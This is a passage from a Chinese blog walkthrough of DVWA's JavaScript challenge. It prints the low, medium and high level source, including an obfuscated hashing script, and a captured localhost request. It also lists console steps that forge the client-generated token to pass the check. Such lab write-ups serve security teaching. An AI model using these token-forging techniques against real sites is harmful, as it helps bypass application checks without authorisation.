title="源码"></a>源码</h2><p>源码如下，中间那一大团使用了 md5 加密生成了 token，和之前的源码不同在于这次 token 是在前端生成的。generate_token() 函数的作用是获取 “phrase” 参数中的值，将其的 rot13 加密的结果进行 md5 加密作为 token 的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*</span><br><span class="hljs-string">MD5 code from here</span><br><span class="hljs-string">https://github.com/blueimp/JavaScript-MD5</span><br><span class="hljs-string">*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    function rot13(inp) &#123;</span><br><span class="hljs-string">        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    function generate_token() &#123;</span><br><span class="hljs-string">        var phrase = document.getElementById(&quot;phrase&quot;).value;</span><br><span class="hljs-string">        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    generate_token();</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">EOF</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>index.php源码。当phrase=”success”,而且token=md5(str_rot13(“success”)),才会成功。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;phrase&quot;</span>, <span class="hljs-variable">$_POST</span>) &amp;&amp; <span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-variable">$_POST</span>)) &#123;<br><br><span class="hljs-variable">$phrase</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phrase&#x27;</span>];<br><span class="hljs-variable">$token</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$phrase</span> == <span class="hljs-string">&quot;success&quot;</span>) &#123;<br><span class="hljs-keyword">switch</span>( <span class="hljs-title function_ invoke__">dvwaSecurityLevelGet</span>() ) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;low&#x27;</span>:<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$token</span> == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-string">&quot;success&quot;</span>))) &#123;<br><span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;p style=&#x27;color:red&#x27;&gt;Well done!&lt;/p&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><p>这里的逻辑就是前后端使用相同的参数和算法生成token，最后再进行对比两个token。一致则通过。</p><ol><li>phrase输入框 <code>success</code></li><li>浏览器F12开发者工具控制台。<code>generate_token()</code></li><li>点击提交</li></ol><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="http请求-1"><a href="#http请求-1" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vulnerabilities/javascript/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>45<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/vulnerabilities/javascript/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=1ekmlj5hkmfpg44br6ilefo6s2; security=medium<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts"><span class="hljs-attr">token</span><span class="hljs-operator">=</span>XXeMegnahCXX<span class="hljs-variable">&amp;phrase</span>=success<span class="hljs-variable">&amp;send</span>=Submit</span><br></code></pre></td></tr></table></figure><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>medium.php源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">&lt;script src=&quot;/vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">EOF</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>生成token的函数在medium.js中，源码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">do_something</span>(<span class="hljs-params">e</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> t=<span class="hljs-string">&quot;&quot;</span>,n=e.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>;n&gt;=<span class="hljs-number">0</span>;n--)t+=e[n];<br>    <span class="hljs-keyword">return</span> t<br>&#125;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-title function_">do_elsesomething</span>(<span class="hljs-string">&quot;XX&quot;</span>)&#125;,<span class="hljs-number">300</span>);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">do_elsesomething</span>(<span class="hljs-params">e</span>)&#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span>=<span class="hljs-title function_">do_something</span>(e+<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span>+<span class="hljs-string">&quot;XX&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol><li>更改phrase输入框 <code>success</code></li><li>还是控制台，<code>setTimeout(function()&#123;do_elsesomething(&quot;XX&quot;)&#125;,300)</code></li><li>点击 <code>submit</code></li></ol><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><p>high.php源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">&lt;script src=&quot;/vulnerabilities/javascript/source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">EOF</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>high.js源码如下,运用了js混淆技术。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a=[<span class="hljs-string">&#x27;fromCharCode&#x27;</span>,<span class="hljs-string">&#x27;toString&#x27;</span>,<span class="hljs-string">&#x27;replace&#x27;</span>,<span class="hljs-string">&#x27;BeJ&#x27;</span>,<span class="hljs-string">&#x27;\x5cw+&#x27;</span>,<span class="hljs-string">&#x27;Lyg&#x27;</span>,<span class="hljs-string">&#x27;SuR&#x27;</span>,<span class="hljs-string">&#x27;(w()&#123;\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:&#123;&#125;;p(Y.3N)&#123;1R=1O&#125;q\x202L=!1R&amp;&amp;1c\x202M===\x271n\x27;q\x202o=!Y.2S&amp;&amp;1c\x202d===\x271n\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o)&#123;Y=3R&#125;z\x20p(2L)&#123;Y=2M&#125;q\x202G=!Y.3Q&amp;&amp;1c\x202g===\x271n\x27&amp;&amp;2g.X;q\x202s=1c\x202l===\x27w\x27&amp;&amp;2l.3P;q\x201y=!Y.3H&amp;&amp;1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S||!1z.1K)&#123;1z.1K=w(1x)&#123;A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27&#125;&#125;p(1y&amp;&amp;(Y.50||!Z.1N))&#123;Z.1N=w(1x)&#123;A\x201c\x201x===\x271n\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z&#125;&#125;q\x202m=w(1X,x)&#123;A\x20w(s)&#123;A\x20O\x20N(x,1d).S(s)[1X]()&#125;&#125;;q\x202a=w(x)&#123;q\x20P=2m(\x271e\x27,x);p(2o)&#123;P=2P(P,x)&#125;P.1T=w()&#123;A\x20O\x20N(x)&#125;;P.S=w(s)&#123;A\x20P.1T().S(s)&#125;;1g(q\x20i=0;i&lt;1E.W;++i)&#123;q\x20T=1E[i];P[T]=2m(T,x)&#125;A\x20P&#125;;q\x202P=w(P,x)&#123;q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s)&#123;p(1c\x20s===\x272p\x27)&#123;A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)&#125;z&#123;p(s===2q||s===2T)&#123;1u\x20O\x201t(1l)&#125;z\x20p(s.1J===Z)&#123;s=O\x202r(s)&#125;&#125;p(1z.1K(s)||Z.1N(s)||s.1J===1Y)&#123;A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)&#125;z&#123;A\x20P(s)&#125;&#125;;A\x202z&#125;;q\x202k=w(1X,x)&#123;A\x20w(G,s)&#123;A\x20O\x201P(G,x,1d).S(s)[1X]()&#125;&#125;;q\x202f=w(x)&#123;q\x20P=2k(\x271e\x27,x);P.1T=w(G)&#123;A\x20O\x201P(G,x)&#125;;P.S=w(G,s)&#123;A\x20P.1T(G).S(s)&#125;;1g(q\x20i=0;i&lt;1E.W;++i)&#123;q\x20T=1E[i];P[T]=2k(T,x)&#125;A\x20P&#125;;w\x20N(x,1v)&#123;p(1v)&#123;l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l&#125;z&#123;k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]&#125;p(x)&#123;k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T&#125;z&#123;k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s&#125;k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x&#125;N.Q.S=w(s)&#123;p(k.1U)&#123;A&#125;q\x202h,T=1c\x20s;p(T!==\x272p\x27)&#123;p(T===\x271n\x27)&#123;p(s===2q)&#123;1u\x20O\x201t(1l)&#125;z\x20p(1y&amp;&amp;s.1J===Z)&#123;s=O\x202r(s)&#125;z\x20p(!1z.1K(s))&#123;p(!1y||!Z.1N(s))&#123;1u\x20O\x201t(1l)&#125;&#125;&#125;z&#123;1u\x20O\x201t(1l)&#125;2h=1d&#125;q\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W)&#123;p(k.1L)&#123;k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0&#125;p(2h)&#123;1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M)&#123;l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]&#125;&#125;z&#123;1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M)&#123;r=s.1Q(M);p(r&lt;R)&#123;l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]&#125;z\x20p(r&lt;2v)&#123;l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]&#125;z\x20p(r&lt;2A||r&gt;=2E)&#123;l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]&#125;z&#123;r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]&#125;&#125;&#125;k.2u=i;k.L+=i-k.1A;p(i&gt;=1k)&#123;k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d&#125;z&#123;k.1A=i&#125;&#125;p(k.L&gt;4r)&#123;k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H&#125;A\x20k&#125;;N.Q.1s=w()&#123;p(k.1U)&#123;A&#125;k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q)&#123;p(!k.1L)&#123;k.1W()&#125;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0&#125;l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()&#125;;N.Q.1W=w()&#123;q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j)&#123;v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0&#125;1D=b&amp;c;1g(j=0;j&lt;1k;j+=4)&#123;p(k.2j)&#123;p(k.x)&#123;1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0&#125;z&#123;1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0&#125;k.2j=1O&#125;z&#123;1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0&#125;1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0&#125;k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0&#125;;N.Q.1e=w()&#123;k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt